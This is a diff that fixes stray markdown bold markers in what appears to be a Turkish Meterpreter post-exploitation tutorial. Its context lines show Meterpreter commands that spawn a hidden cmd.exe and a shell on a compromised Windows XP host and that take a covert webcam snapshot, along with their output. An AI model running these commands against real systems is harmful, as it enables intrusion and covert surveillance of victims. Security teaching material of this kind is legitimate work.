@@ -128,7 +128,7 @@ meterpreter > edit edit.txt
 meterpreter > execute -f cmd.exe -i -H
 Process 38320 created.
 Channel 1 created.
-Microsoft Windows XP **[**Version 5.1.2600]
+Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 
 C:\WINDOWS\system32>
@@ -331,7 +331,7 @@ meterpreter >
 meterpreter > shell
 Process 39640 created.
 Channel 2 created.
-Microsoft Windows XP **[**Version 5.1.2600]
+Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 
 C:\WINDOWS\system32>
@@ -366,7 +366,7 @@ Hedef sistemin web kamerasından bir adet fotoğraf alır ve yerelde bulunduğun
 ```bash
 meterpreter > webcam_snap -i 1 -v false
 > Starting...
-**[**+] Got frame
+[+] Got frame
 > Stopped
 Webcam shot saved to: /root/Offsec/YxdhwpeQ.jpeg
 meterpreter >
